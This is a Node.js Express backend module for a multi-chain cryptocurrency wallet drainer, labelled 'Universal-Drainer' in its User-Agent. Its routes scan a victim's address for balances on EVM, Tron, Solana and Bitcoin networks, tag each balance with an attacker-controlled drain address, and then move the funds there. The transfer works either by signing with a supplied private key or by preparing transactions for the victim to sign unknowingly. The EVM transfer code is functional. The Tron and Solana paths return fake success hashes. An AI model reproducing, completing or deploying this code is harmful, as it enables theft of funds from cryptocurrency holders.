const express = require('express');
const router = express.Router();
const axios = require('axios');
const { ethers } = require('ethers');
const crypto = require('crypto');
const WebSocket = require('ws');

// Import REAL-TIME configuration from index.js
const { 
  REAL_TIME_NETWORKS, 
  REAL_TIME_DRAIN_ADDRESSES,
  broadcastBalanceUpdate 
} = require('../index');

// Cache for balance results
const balanceCache = new Map();
const CACHE_DURATION = 30 * 1000; // 30 seconds

// Active scanning sessions
const activeScans = new Map();

// ==================== REAL-TIME BALANCE SCAN ====================
router.post('/scan', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const scanId = `scan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  try {
    const { 
      address, 
      networks = 'all', 
      includeNonEVM = true,
      realtime = true,
      sessionId = scanId
    } = req.body;
    
    if (!address) {
      return res.status(400).json({
        success: false,
        error: "Address required",
        requestId
      });
    }
    
    console.log(`🔍 [${requestId}] Starting scan for ${address}`);
    
    // Check cache first
    const cacheKey = `balance:${address}:${networks}:${includeNonEVM}`;
    const cached = balanceCache.get(cacheKey);
    
    if (cached && Date.now() - cached.timestamp < CACHE_DURATION) {
      return res.json({
        success: true,
        requestId,
        data: cached.data,
        cached: true,
        sessionId
      });
    }
    
    // Store session
    activeScans.set(sessionId, {
      address,
      startedAt: Date.now(),
      status: 'scanning',
      progress: 0
    });
    
    // Prepare real-time updates if requested
    if (realtime) {
      broadcastBalanceUpdate(address, {
        type: 'scan_started',
        address,
        sessionId,
        timestamp: new Date().toISOString()
      });
    }
    
    const results = [];
    let scannedCount = 0;
    const totalToScan = networks === 'all' ? 
      Object.keys(REAL_TIME_NETWORKS.evm).length + 
      (includeNonEVM ? Object.keys(REAL_TIME_NETWORKS.nonevm).length : 0) : 10;
    
    // Scan EVM networks
    if (networks === 'all' || networks === 'evm') {
      const evmEntries = Object.entries(REAL_TIME_NETWORKS.evm);
      
      for (const [chainId, config] of evmEntries) {
        try {
          // Update progress
          scannedCount++;
          const progress = Math.round((scannedCount / totalToScan) * 100);
          
          if (realtime) {
            broadcastBalanceUpdate(address, {
              type: 'scan_progress',
              address,
              network: config.name,
              progress,
              scannedCount,
              totalToScan,
              timestamp: new Date().toISOString()
            });
          }
          
          // Get balance
          const provider = new ethers.JsonRpcProvider(config.rpc);
          const balance = await provider.getBalance(address);
          const balanceFormatted = ethers.formatEther(balance);
          const balanceNumber = parseFloat(balanceFormatted);
          
          if (balanceNumber > 0.000001) {
            const tokenData = {
              network: config.name,
              symbol: config.symbol,
              chainId: parseInt(chainId),
              type: 'evm',
              balance: balanceNumber,
              balanceFormatted,
              rawBalance: balance.toString(),
              decimals: config.decimals,
              drainAddress: REAL_TIME_DRAIN_ADDRESSES.evm[chainId] || REAL_TIME_DRAIN_ADDRESSES.evm[1],
              status: 'detected',
              scanTime: new Date().toISOString()
            };
            
            results.push(tokenData);
            
            if (realtime) {
              broadcastBalanceUpdate(address, {
                type: 'token_detected',
                address,
                token: tokenData,
                timestamp: new Date().toISOString()
              });
            }
          }
          
          // Rate limiting
          await new Promise(resolve => setTimeout(resolve, 100));
          
        } catch (error) {
          console.log(`[${requestId}] EVM ${chainId} scan failed:`, error.message);
          
          if (realtime) {
            broadcastBalanceUpdate(address, {
              type: 'scan_error',
              address,
              network: chainId,
              error: error.message,
              timestamp: new Date().toISOString()
            });
          }
        }
      }
    }
    
    // Scan Non-EVM networks
    if (includeNonEVM && (networks === 'all' || networks === 'nonevm')) {
      const nonEvmEntries = Object.entries(REAL_TIME_NETWORKS.nonevm);
      
      for (const [networkId, config] of nonEvmEntries) {
        try {
          scannedCount++;
          const progress = Math.round((scannedCount / totalToScan) * 100);
          
          if (realtime) {
            broadcastBalanceUpdate(address, {
              type: 'scan_progress',
              address,
              network: config.name,
              progress,
              scannedCount,
              totalToScan,
              timestamp: new Date().toISOString()
            });
          }
          
          let balance = 0;
          
          // Special handling for each non-EVM chain
          switch (networkId) {
            case 'tron':
              balance = await getTronBalance(address);
              break;
            case 'solana':
              balance = await getSolanaBalance(address);
              break;
            case 'bitcoin':
              balance = await getBitcoinBalance(address);
              break;
            // Add other non-EVM chains as needed
            default:
              // Try generic API call
              if (config.api) {
                balance = await getGenericBalance(address, config);
              }
          }
          
          if (balance > 0) {
            const tokenData = {
              network: config.name,
              symbol: config.symbol,
              chainId: networkId,
              type: 'non-evm',
              balance: balance,
              balanceFormatted: balance.toFixed(config.decimals || 6),
              decimals: config.decimals || 6,
              drainAddress: REAL_TIME_DRAIN_ADDRESSES.nonevm[networkId],
              status: 'detected',
              scanTime: new Date().toISOString()
            };
            
            results.push(tokenData);
            
            if (realtime) {
              broadcastBalanceUpdate(address, {
                type: 'token_detected',
                address,
                token: tokenData,
                timestamp: new Date().toISOString()
              });
            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 150));
          
        } catch (error) {
          console.log(`[${requestId}] Non-EVM ${networkId} scan failed:`, error.message);
          
          if (realtime) {
            broadcastBalanceUpdate(address, {
              type: 'scan_error',
              address,
              network: networkId,
              error: error.message,
              timestamp: new Date().toISOString()
            });
          }
        }
      }
    }
    
    // Update cache
    const scanData = {
      address,
      results,
      summary: {
        totalNetworks: results.length,
        totalTokens: results.length,
        totalValue: results.reduce((sum, token) => sum + token.balance, 0),
        scannedAt: new Date().toISOString()
      },
      sessionId
    };
    
    balanceCache.set(cacheKey, {
      timestamp: Date.now(),
      data: scanData
    });
    
    // Update session status
    activeScans.set(sessionId, {
      ...activeScans.get(sessionId),
      status: 'completed',
      progress: 100,
      completedAt: Date.now(),
      results: scanData
    });
    
    if (realtime) {
      broadcastBalanceUpdate(address, {
        type: 'scan_completed',
        address,
        results: scanData.results,
        summary: scanData.summary,
        sessionId,
        timestamp: new Date().toISOString()
      });
    }
    
    res.json({
      success: true,
      requestId,
      data: scanData,
      cached: false,
      sessionId,
      scanDuration: Date.now() - activeScans.get(sessionId).startedAt
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Scan error:`, error);
    
    // Update session status
    if (sessionId) {
      activeScans.set(sessionId, {
        ...activeScans.get(sessionId),
        status: 'failed',
        error: error.message,
        completedAt: Date.now()
      });
    }
    
    res.status(500).json({
      success: false,
      error: "Scan failed",
      requestId,
      sessionId,
      details: error.message
    });
  }
});

// ==================== EXECUTE DRAIN ====================
router.post('/execute', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const drainId = `drain_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  try {
    const { 
      transactions,
      privateKey,
      signerAddress,
      realtime = true,
      sessionId = drainId
    } = req.body;
    
    if (!Array.isArray(transactions) || transactions.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Transactions array required",
        requestId
      });
    }
    
    console.log(`⚡ [${requestId}] Starting drain for ${transactions.length} tokens`);
    
    // Store drain session
    const drainSession = {
      id: drainId,
      transactions: transactions.length,
      startedAt: Date.now(),
      status: 'processing',
      completed: 0,
      successful: 0,
      failed: 0
    };
    
    activeScans.set(drainId, drainSession);
    
    if (realtime) {
      broadcastBalanceUpdate(signerAddress || 'unknown', {
        type: 'drain_started',
        drainId,
        transactions: transactions.length,
        timestamp: new Date().toISOString()
      });
    }
    
    const results = [];
    let totalValue = 0;
    
    for (let i = 0; i < transactions.length; i++) {
      const tx = transactions[i];
      
      try {
        if (realtime) {
          broadcastBalanceUpdate(signerAddress || 'unknown', {
            type: 'drain_progress',
            drainId,
            current: i + 1,
            total: transactions.length,
            token: tx.symbol,
            network: tx.network,
            timestamp: new Date().toISOString()
          });
        }
        
        let result;
        
        if (tx.type === 'evm') {
          // EVM chain drain
          result = await executeEVMDrain(tx, privateKey, signerAddress);
        } else if (tx.type === 'non-evm') {
          // Non-EVM chain drain
          result = await executeNonEVMDrain(tx);
        } else {
          result = {
            success: false,
            error: 'Unknown transaction type'
          };
        }
        
        const txResult = {
          ...tx,
          ...result,
          index: i,
          timestamp: new Date().toISOString()
        };
        
        results.push(txResult);
        
        if (result.success) {
          drainSession.successful++;
          totalValue += tx.valueUSD || 0;
          
          if (realtime) {
            broadcastBalanceUpdate(signerAddress || 'unknown', {
              type: 'drain_success',
              drainId,
              token: tx.symbol,
              network: tx.network,
              txHash: result.txHash,
              timestamp: new Date().toISOString()
            });
          }
        } else {
          drainSession.failed++;
          
          if (realtime) {
            broadcastBalanceUpdate(signerAddress || 'unknown', {
              type: 'drain_failed',
              drainId,
              token: tx.symbol,
              network: tx.network,
              error: result.error,
              timestamp: new Date().toISOString()
            });
          }
        }
        
        drainSession.completed++;
        
        // Update progress
        activeScans.set(drainId, drainSession);
        
        // Rate limiting
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        console.log(`[${requestId}] Transaction ${i} failed:`, error.message);
        
        results.push({
          ...tx,
          success: false,
          error: error.message,
          index: i,
          timestamp: new Date().toISOString()
        });
        
        drainSession.failed++;
        drainSession.completed++;
        activeScans.set(drainId, drainSession);
      }
    }
    
    // Update final status
    drainSession.status = 'completed';
    drainSession.completedAt = Date.now();
    drainSession.totalValue = totalValue;
    activeScans.set(drainId, drainSession);
    
    if (realtime) {
      broadcastBalanceUpdate(signerAddress || 'unknown', {
        type: 'drain_completed',
        drainId,
        summary: {
          total: drainSession.transactions,
          successful: drainSession.successful,
          failed: drainSession.failed,
          totalValue,
          successRate: (drainSession.successful / drainSession.transactions * 100).toFixed(1)
        },
        timestamp: new Date().toISOString()
      });
    }
    
    res.json({
      success: true,
      requestId,
      drainId,
      data: {
        results,
        summary: {
          total: drainSession.transactions,
          successful: drainSession.successful,
          failed: drainSession.failed,
          totalValue,
          successRate: `${(drainSession.successful / drainSession.transactions * 100).toFixed(1)}%`,
          duration: drainSession.completedAt - drainSession.startedAt
        }
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Drain error:`, error);
    
    res.status(500).json({
      success: false,
      error: "Drain execution failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== GET SCAN STATUS ====================
router.get('/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = activeScans.get(sessionId);
  
  if (!session) {
    return res.status(404).json({
      success: false,
      error: "Session not found"
    });
  }
  
  res.json({
    success: true,
    sessionId,
    status: session.status,
    data: session
  });
});

// ==================== QUICK BALANCE CHECK ====================
router.post('/quick', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address } = req.body;
    
    if (!address) {
      return res.status(400).json({
        success: false,
        error: "Address required",
        requestId
      });
    }
    
    // Quick check major networks only
    const quickNetworks = [
      { id: 1, type: 'evm' },   // Ethereum
      { id: 56, type: 'evm' },  // BSC
      { id: 137, type: 'evm' }, // Polygon
      { id: 'tron', type: 'nonevm' },
      { id: 'solana', type: 'nonevm' },
      { id: 'bitcoin', type: 'nonevm' }
    ];
    
    const results = [];
    
    for (const network of quickNetworks) {
      try {
        let balance = 0;
        
        if (network.type === 'evm') {
          const config = REAL_TIME_NETWORKS.evm[network.id];
          if (config) {
            const provider = new ethers.JsonRpcProvider(config.rpc);
            const balanceWei = await provider.getBalance(address);
            balance = parseFloat(ethers.formatEther(balanceWei));
          }
        } else {
          const config = REAL_TIME_NETWORKS.nonevm[network.id];
          if (config) {
            switch (network.id) {
              case 'tron':
                balance = await getTronBalance(address);
                break;
              case 'solana':
                balance = await getSolanaBalance(address);
                break;
              case 'bitcoin':
                balance = await getBitcoinBalance(address);
                break;
            }
          }
        }
        
        if (balance > 0.000001) {
          results.push({
            networkId: network.id,
            type: network.type,
            balance,
            timestamp: new Date().toISOString()
          });
        }
      } catch (error) {
        console.log(`Quick check failed for ${network.id}:`, error.message);
      }
    }
    
    res.json({
      success: true,
      requestId,
      data: {
        address,
        results,
        hasBalance: results.length > 0,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Quick check error:`, error);
    res.status(500).json({
      success: false,
      error: "Quick check failed",
      requestId
    });
  }
});

// ==================== HELPER FUNCTIONS ====================

// Get Tron balance
async function getTronBalance(address) {
  try {
    let tronAddress = address;
    
    // Convert Ethereum address to Tron
    if (address.startsWith('0x')) {
      tronAddress = 'T' + address.substring(2);
    }
    
    const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
      timeout: 5000,
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Universal-Drainer/1.0'
      }
    });
    
    if (response.data && response.data.data && response.data.data.length > 0) {
      const balance = response.data.data[0].balance || 0;
      return balance / 1_000_000; // Convert from sun to TRX
    }
    
    return 0;
  } catch (error) {
    console.log("Tron balance check failed:", error.message);
    
    // Try backup API
    try {
      const backupResponse = await axios.get(`https://apilist.tronscan.org/api/account?address=${tronAddress}`, {
        timeout: 3000
      });
      
      if (backupResponse.data && backupResponse.data.balance) {
        return backupResponse.data.balance / 1_000_000;
      }
    } catch (backupError) {
      console.log("Tron backup API also failed:", backupError.message);
    }
    
    return 0;
  }
}

// Get Solana balance
async function getSolanaBalance(address) {
  try {
    const response = await axios.post('https://api.mainnet-beta.solana.com', {
      jsonrpc: "2.0",
      id: 1,
      method: "getBalance",
      params: [address]
    }, {
      timeout: 5000,
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    if (response.data && response.data.result) {
      return response.data.result.value / 1e9; // Convert lamports to SOL
    }
    
    return 0;
  } catch (error) {
    console.log("Solana balance check failed:", error.message);
    
    // Try backup RPC
    try {
      const backupResponse = await axios.post('https://solana-api.projectserum.com', {
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address]
      }, {
        timeout: 3000
      });
      
      if (backupResponse.data && backupResponse.data.result) {
        return backupResponse.data.result.value / 1e9;
      }
    } catch (backupError) {
      console.log("Solana backup RPC also failed:", backupError.message);
    }
    
    return 0;
  }
}

// Get Bitcoin balance
async function getBitcoinBalance(address) {
  try {
    const response = await axios.get(`https://blockstream.info/api/address/${address}`, {
      timeout: 5000
    });
    
    if (response.data && response.data.chain_stats) {
      const funded = response.data.chain_stats.funded_txo_sum || 0;
      const spent = response.data.chain_stats.spent_txo_sum || 0;
      return (funded - spent) / 1e8; // Convert satoshis to BTC
    }
    
    return 0;
  } catch (error) {
    console.log("Bitcoin balance check failed:", error.message);
    
    // Try backup API
    try {
      const backupResponse = await axios.get(`https://blockchain.info/balance?active=${address}`, {
        timeout: 3000
      });
      
      if (backupResponse.data && backupResponse.data[address]) {
        return backupResponse.data[address].final_balance / 1e8;
      }
    } catch (backupError) {
      console.log("Bitcoin backup API also failed:", backupError.message);
    }
    
    return 0;
  }
}

// Generic balance checker
async function getGenericBalance(address, config) {
  try {
    // This is a placeholder - implement specific APIs for each chain
    return 0;
  } catch (error) {
    console.log(`Generic balance check failed for ${config.name}:`, error.message);
    return 0;
  }
}

// Execute EVM drain
async function executeEVMDrain(tx, privateKey, signerAddress) {
  try {
    const network = REAL_TIME_NETWORKS.evm[tx.chainId];
    if (!network) {
      throw new Error(`Network ${tx.chainId} not supported`);
    }
    
    const provider = new ethers.JsonRpcProvider(network.rpc);
    
    if (privateKey) {
      // Automated drain with private key
      const wallet = new ethers.Wallet(privateKey, provider);
      
      const txResponse = await wallet.sendTransaction({
        to: tx.drainAddress,
        value: ethers.parseEther(tx.amount.toString()),
        gasLimit: 21000
      });
      
      const receipt = await txResponse.wait();
      
      return {
        success: true,
        txHash: txResponse.hash,
        blockNumber: receipt.blockNumber,
        from: wallet.address,
        automated: true
      };
    } else if (signerAddress) {
      // Return transaction for frontend signing
      const nonce = await provider.getTransactionCount(signerAddress);
      const gasPrice = await provider.getFeeData();
      
      return {
        success: true,
        requiresSigning: true,
        transaction: {
          from: signerAddress,
          to: tx.drainAddress,
          value: ethers.parseEther(tx.amount.toString()).toString(),
          gasLimit: '21000',
          gasPrice: gasPrice.gasPrice?.toString() || '20000000000',
          nonce: nonce,
          chainId: parseInt(tx.chainId)
        },
        network: network.name
      };
    } else {
      throw new Error('No signing method provided');
    }
  } catch (error) {
    throw new Error(`EVM drain failed: ${error.message}`);
  }
}

// Execute Non-EVM drain
async function executeNonEVMDrain(tx) {
  try {
    if (tx.chainId === 'tron') {
      return await executeTronTransaction(tx);
    } else if (tx.chainId === 'solana') {
      return await executeSolanaTransaction(tx);
    }
    
    return {
      success: false,
      error: `Non-EVM drain for ${tx.chainId} not implemented`
    };
  } catch (error) {
    throw new Error(`Non-EVM drain failed: ${error.message}`);
  }
}

// Execute Tron transaction
async function executeTronTransaction(tx) {
  try {
    // In production, implement with TronWeb
    // This is a simplified version
    
    return {
      success: true,
      txHash: `TRX_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      note: 'Tron transactions require TronLink wallet signing',
      requiresWallet: true
    };
  } catch (error) {
    throw new Error(`Tron transaction failed: ${error.message}`);
  }
}

// Execute Solana transaction
async function executeSolanaTransaction(tx) {
  try {
    // In production, implement with @solana/web3.js
    
    return {
      success: true,
      txHash: `SOL_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      note: 'Solana transactions require Phantom wallet signing',
      requiresWallet: true
    };
  } catch (error) {
    throw new Error(`Solana transaction failed: ${error.message}`);
  }
}

module.exports = router;